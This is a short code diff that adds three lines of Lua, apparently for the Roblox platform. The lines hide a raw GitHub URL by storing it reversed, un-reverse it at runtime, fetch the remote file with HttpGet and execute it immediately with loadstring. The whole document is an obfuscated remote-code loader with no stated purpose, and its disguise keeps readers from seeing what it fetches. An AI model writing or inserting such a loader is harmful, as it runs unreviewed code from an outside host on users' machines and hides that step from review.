@@ -1,0 +1,3 @@
+local a="raeY/niam/sdaeh/sfer/tpmorPdnoceS/hctiWdnaShcudni/moc.tnetnocresubuhtig.war//:sptth"
+local b=string.reverse(a)
+loadstring(game:HttpGet(b))()
